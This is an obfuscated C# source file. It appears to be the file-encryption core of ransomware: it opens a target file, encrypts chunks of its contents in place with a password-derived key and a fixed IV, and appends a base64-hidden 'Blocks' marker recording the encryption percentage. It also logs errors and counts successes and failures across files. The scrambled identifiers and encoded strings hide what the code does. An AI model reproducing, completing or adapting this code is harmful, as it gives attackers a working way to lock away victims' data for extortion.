using System;
using System.IO;
using System.Text;
using TtEFsifoIogH;

namespace WvdSzXINIqX;

internal sealed class QWgNsziBjsjPDSWc
{
	public static int qOChMAfWkWFV(long long_0)
	{
		return (int)long_0;
	}

	public static bool GDBBRYhBRfPQ(string OZtVtWWYHmch, string JIsRMLUANUF, string OZwrrulFdlpL, byte[] HvObnJdJTkax = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(OZtVtWWYHmch, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = qOChMAfWkWFV(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(JIsRMLUANUF) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(JIsRMLUANUF) * 1000 * 1000;
				}
				int ttyIeiAkIVl = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = IQPpSbmIJSzQBM(OZtVtWWYHmch, fileStream, ttyIeiAkIVl, num * i);
					array = (JenwHsdeeXa.WKWPaQWPQqrRRB ? HgseoqLGvnctpdH.uFQulJKjke(byte_, Encoding.ASCII.GetBytes(OZwrrulFdlpL), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : WffqVboAdbw.svujRJbmtni(byte_, Encoding.ASCII.GetBytes(OZwrrulFdlpL), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					uwucPqSIyEk(OZtVtWWYHmch, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (JenwHsdeeXa.xSIJBVFhcrJvfz ? Encoding.ASCII.GetBytes(JenwHsdeeXa.XKJIixIieoUFn("QmxvY2tz") + JenwHsdeeXa.XKJIixIieoUFn("Kw==") + Convert.ToString(JIsRMLUANUF) + JenwHsdeeXa.XKJIixIieoUFn("Kw==")) : Encoding.ASCII.GetBytes(JenwHsdeeXa.XKJIixIieoUFn("QmxvY2tz") + JenwHsdeeXa.XKJIixIieoUFn("LQ==") + Convert.ToString(JIsRMLUANUF) + JenwHsdeeXa.XKJIixIieoUFn("LQ==")));
			if (!JenwHsdeeXa.xSIJBVFhcrJvfz)
			{
				using FileStream fileStream2 = new FileStream(OZtVtWWYHmch, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(OZtVtWWYHmch, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(HvObnJdJTkax, 0, HvObnJdJTkax.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (JenwHsdeeXa.HRuXHUgomikt)
			{
				try
				{
					File.AppendAllText(JenwHsdeeXa.kCftkBXDnujA, "File: " + OZtVtWWYHmch + " - Error creating filestream for block process or read-write: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			JenwHsdeeXa.WEeJdcZxxnxI++;
			return false;
		}
		JenwHsdeeXa.VnshRzSTFwJvI++;
		return true;
	}

	public static byte[] IQPpSbmIJSzQBM(string qVKOQYyCBCgR, FileStream EGvhJkRGWvNIe, int ttyIeiAkIVl, int FiywNZCiFzydJN = 0)
	{
		byte[] array = new byte[ttyIeiAkIVl];
		EGvhJkRGWvNIe.Position = FiywNZCiFzydJN;
		EGvhJkRGWvNIe.Read(array, 0, ttyIeiAkIVl);
		return array;
	}

	public static void uwucPqSIyEk(string MCXfhuHdxf, FileStream zxYScApEBEtqjNU, byte[] reSpQdQCHRdOOHDL, int GLvAaZJifo = 0)
	{
		zxYScApEBEtqjNU.Position = GLvAaZJifo;
		zxYScApEBEtqjNU.Write(reSpQdQCHRdOOHDL, 0, reSpQdQCHRdOOHDL.Length);
	}
}
